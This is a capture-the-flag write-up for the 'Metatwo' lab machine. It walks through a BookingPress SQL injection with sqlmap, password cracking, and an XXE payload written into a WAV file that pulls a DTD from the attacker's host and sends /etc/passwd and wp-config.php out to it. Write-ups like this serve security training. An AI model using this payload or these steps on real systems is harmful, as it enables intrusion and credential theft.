# Metatwo

We start by checking the connectivity with the machine:

![Untitled](Metatwo_imgs/Untitled.png)

And now we try to get all open ports:

![Untitled](Metatwo_imgs/Untitled%201.png)

We see ports 21(ftp), 22(ssh) and 80(http). Now we add the host to de /etc/hosts and access to the web.

![Untitled](Metatwo_imgs/Untitled%202.png)

We can see that it is a WordPress site:

![Untitled](Metatwo_imgs/Untitled%203.png)

We check the source code to discover what is using and discover that is using “bookingpress”:

![Untitled](Metatwo_imgs/Untitled%204.png)

BookingPress is a full-fledged appointment booking plugin that allows setting up a complete booking system according to your requirements on your WordPress website with super ease. The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection. [https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

We need to capture the..

![Untitled](Metatwo_imgs/Untitled%205.png)

And modify it like:

![Untitled](Metatwo_imgs/Untitled%206.png)

With this we can launch sqlmap.

![Untitled](Metatwo_imgs/Untitled%207.png)

Now list all databases

![Untitled](Metatwo_imgs/Untitled%208.png)

![Untitled](Metatwo_imgs/Untitled%209.png)

And all the tables in blog database:

![Untitled](Metatwo_imgs/Untitled%2010.png)

![Untitled](Metatwo_imgs/Untitled%2011.png)

And now we dump wp_users

![Untitled](Metatwo_imgs/Untitled%2012.png)

![Untitled](Metatwo_imgs/Untitled%2013.png)

And now with jhon we can crack the password:

![Untitled](Metatwo_imgs/Untitled%2014.png)

And with this we are able to login: 

![Untitled](Metatwo_imgs/Untitled%2015.png)

For the exploitation, we need to create a WAV file which will fetch the another file called dedsec.dtd which has our malicious content inside.

```sql
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.XX.XX:9001/dedsec.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

![Untitled](Metatwo_imgs/Untitled%2016.png)

We should host an http host in our machine and load the payload in the web, and when the payload is loaded we will receive connection to our web server that will load dedsec.dtd that will make a request to our server with the content of /etc/passwd in binary.

![Untitled](Metatwo_imgs/Untitled%2017.png)

Now we convert the binary to base64 

![Untitled](Metatwo_imgs/Untitled%2018.png)

With this credentials i don’t get nothing :’)

So now i will try to get wp-config.php, to do so we should modify the dedsec.dtd :

![Untitled](Metatwo_imgs/Untitled%2019.png)

An load the payload again to get:

![Untitled](Metatwo_imgs/Untitled%2020.png)

And again decode it:

![Untitled](Metatwo_imgs/Untitled%2021.png)

Now with this creds try to acces through ftp:

![Untitled](Metatwo_imgs/Untitled%2022.png)

Once in we discover a php file, that we will download:

![Untitled](Metatwo_imgs/Untitled%2023.png)

![Untitled](Metatwo_imgs/Untitled%2024.png)

Here we see “jnelson” creds and we will use it to log in using ssh

![Untitled](Metatwo_imgs/Untitled%2025.png)

And now get the user flag.

Also here we see: 

![Untitled](Metatwo_imgs/Untitled%2026.png)

And inside passpie we found a key file:

![Untitled](Metatwo_imgs/Untitled%2027.png)

We send this file to our machine:

![Untitled](Metatwo_imgs/Untitled%2028.png)

Now we convert the private key in jhon format:

![Untitled](Metatwo_imgs/Untitled%2029.png)

And crack it using wordlist:

![Untitled](Metatwo_imgs/Untitled%2030.png)

Now with the password we can get the passwords of passpie and export all the passwords:

![Untitled](Metatwo_imgs/Untitled%2031.png)

With the password dumped we are able to login as root and get the flag.